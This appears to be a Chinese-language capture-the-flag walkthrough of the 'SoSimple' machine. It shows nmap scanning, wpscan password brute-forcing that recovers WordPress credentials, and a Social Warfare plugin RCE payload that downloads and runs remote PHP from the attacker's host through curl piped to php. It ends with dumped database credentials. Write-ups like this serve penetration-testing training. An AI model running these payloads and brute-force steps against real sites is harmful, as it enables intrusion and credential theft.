# SoSimple

```
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.195.78
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 21:40 CST
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 21:40 (0:00:06 remaining)
Nmap scan report for 192.168.195.78
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b5543efafd03d0e63207af4ac416a45 (RSA)
|   256 53f5231be9aa8f41e218c6055007d8d4 (ECDSA)
|_  256 55b77b7e0bf54d1bdfc35da1d768a96b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: So Simple
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/18%OT=22%CT=1%CU=42083%PV=Y%DS=4%DC=T%G=Y%TM=64662AF
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=1
OS:06%GCD=1%ISR=10B%TI=Z%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT1
OS:1NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE
OS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16
OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A5B4%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   273.41 ms 192.168.45.1
2   273.36 ms 192.168.45.254
3   ...
4   273.46 ms 192.168.195.78

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.87 seconds
                                                               
```

目录探测中发现/wordpress目录，尝试用wpscan枚举账户名，爆破密码

```
wpscan --url http://192.168.195.78/wordpress/ --enumerate u

```

```
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# wpscan --url http://192.168.195.78/wordpress/ --username admin --wordlist /usr/share/wordlists/rockyou.txt


Scan Aborted: invalid option: --username
Did you mean?  usernames
                                                                                                                        
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# wpscan --url http://192.168.195.78/wordpress/ --usernames admin --wordlist /usr/share/wordlists/rockyou.txt --threads 50

Scan Aborted: invalid option: --wordlist
                                                                                                                        
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# wpscan --url http://192.168.195.78/wordpress/ --wordlist /usr/share/wordlists/rockyou.txt --usernames admin --threads 50

Scan Aborted: invalid option: --wordlist
                                                                                                                        
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# wpscan --url http://192.168.195.78/wordpress/ /usr/share/wordlists/rockyou.txt --usernames admin --threads 50   1 ⨯

Scan Aborted: invalid option: --threads
                                                                                                                        
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# wpscan --url http://192.168.195.78/wordpress/ /usr/share/wordlists/rockyou.txt --usernames admin                1 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.195.78/wordpress/ [192.168.195.78]
[+] Started: Thu May 18 21:59:21 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.195.78/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.195.78/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.195.78/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.195.78/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.195.78/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://192.168.195.78/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simple-cart-solution
 | Location: http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/
 | Last Updated: 2022-04-17T20:50:00.000Z
 | [!] The version is out of date, the latest version is 1.0.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 0.2.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt

[+] social-warfare
 | Location: http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2023-02-15T16:23:00.000Z
 | [!] The version is out of date, the latest version is 4.4.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.195.78/wordpress/, Match: 'Social Warfare v3.5.0'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <=========================================> (137 / 137) 100.00% Time: 00:00:10

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu May 18 21:59:49 2023
[+] Requests Done: 174
[+] Cached Requests: 5
[+] Data Sent: 48.665 KB
[+] Data Received: 576.617 KB
[+] Memory used: 247.449 MB
[+] Elapsed time: 00:00:28
                                                                                                                        
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# wpscan --url http://192.168.195.78/wordpress/ -u admin -P /usr/share/wordlists/rockyou.txt --threads 50

Scan Aborted: invalid option: -u
Did you mean?  ua
                                                                                                                        
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# wpscan --url http://192.168.195.78/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt --threads 50         1 ⨯

Scan Aborted: invalid option: --threads
                                                                                                                        
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# wpscan --url http://192.168.195.78/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt \                    1 ⨯
> 
                                                                                                                        
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# wpscan --url http://192.168.195.78/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt                    130 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.195.78/wordpress/ [192.168.195.78]
[+] Started: Thu May 18 22:01:49 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.195.78/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.195.78/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.195.78/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.195.78/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.195.78/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://192.168.195.78/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simple-cart-solution
 | Location: http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/
 | Last Updated: 2022-04-17T20:50:00.000Z
 | [!] The version is out of date, the latest version is 1.0.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 0.2.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt

[+] social-warfare
 | Location: http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2023-02-15T16:23:00.000Z
 | [!] The version is out of date, the latest version is 4.4.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.195.78/wordpress/, Match: 'Social Warfare v3.5.0'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:09 <=========================================> (137 / 137) 100.00% Time: 00:00:09
```

```
┌──(root💀Chinchin)-[~/桌面/vpn]
└─#  wpscan --url http://192.168.195.78/wordpress/ -U MAX -P /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

^C^C
Scan Aborted: Canceled by User
                                                                                                                        
┌──(root💀Chinchin)-[~/桌面/vpn]
└─#  wpscan --url http://192.168.195.78/wordpress/ -U max -P /usr/share/wordlists/rockyou.txt                       2 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.195.78/wordpress/ [192.168.195.78]
[+] Started: Thu May 18 22:02:37 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.195.78/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.195.78/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.195.78/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.195.78/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.195.78/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://192.168.195.78/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simple-cart-solution
 | Location: http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/
 | Last Updated: 2022-04-17T20:50:00.000Z
 | [!] The version is out of date, the latest version is 1.0.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 0.2.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt

[+] social-warfare
 | Location: http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2023-02-15T16:23:00.000Z
 | [!] The version is out of date, the latest version is 4.4.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.195.78/wordpress/, Match: 'Social Warfare v3.5.0'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:09 <=========================================> (137 / 137) 100.00% Time: 00:00:09

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - max / opensesame                                                                                            
Trying max / mustafa Time: 00:18:39 <                                          > (5960 / 14350351)  0.04%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: max, Password: opensesame

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu May 18 22:21:31 2023
[+] Requests Done: 6099
[+] Cached Requests: 42
[+] Data Sent: 2.118 MB
[+] Data Received: 34.419 MB
[+] Memory used: 310.586 MB
[+] Elapsed time: 00:18:54
                                                                      
```

[+] social-warfare存在远程代码执行漏洞，可以在vps上创建txt，payload为

```php
<pre>phpinfo()</pre>
```

pre标签里的内容会作为eval()的参数值，也就是我们可以通过控制标签内容达到RCE的效果

构建payload，curl读取反弹shell的php代码到标准输出，并作为执行

```
<pre>system("curl http://192.168.45.169:5555/eval.php|php")</pre>
```

```
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wp_user' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password' );


```


